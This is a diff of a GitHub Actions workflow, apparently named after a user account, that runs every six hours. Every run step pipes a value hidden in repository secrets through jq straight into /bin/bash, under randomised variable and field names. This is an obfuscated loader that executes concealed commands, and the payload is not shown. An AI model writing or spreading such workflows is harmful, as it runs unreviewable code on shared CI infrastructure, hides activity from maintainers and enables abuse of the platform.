@@ -2,24 +2,24 @@ name: jiangzehong1293
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 4/6 * * *'
+    - cron: '4 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangzehong1293
         env:
-          d806: ${{ secrets.d806 }}
+          twet75123: ${{ secrets.twet75123 }}
         run: |
-          echo $d806 | jq -r .kcpr2076 | /bin/bash
-          echo $lgr6838 | jq -r .omw61 | /bin/bash
-          echo $y025 | jq -r .yqx5 | /bin/bash
-          echo $voxi4 | jq -r .ikk6 | /bin/bash
-          echo $xyrko3 | jq -r .t3828 | /bin/bash
-          echo $go056 | jq -r .nwk1 | /bin/bash
-          echo $vmdjf74864 | jq -r .dpsyl464 | /bin/bash
-          echo $asqcc79616 | jq -r .wvgz0 | /bin/bash
-          echo $zcb1045 | jq -r .yyqh770 | /bin/bash
-          echo $ovxs2 | jq -r .ft45538 | /bin/bash
+          echo $twet75123 | jq -r .l45580 | /bin/bash
+          echo $rl4767 | jq -r .c6 | /bin/bash
+          echo $oukd326 | jq -r .toexk4773 | /bin/bash
+          echo $rvhv0 | jq -r .ojvxw1 | /bin/bash
+          echo $vnkjr2 | jq -r .sfj4 | /bin/bash
+          echo $c9 | jq -r .c786 | /bin/bash
+          echo $q1329 | jq -r .u6 | /bin/bash
+          echo $xepra57 | jq -r .uw25810 | /bin/bash
 
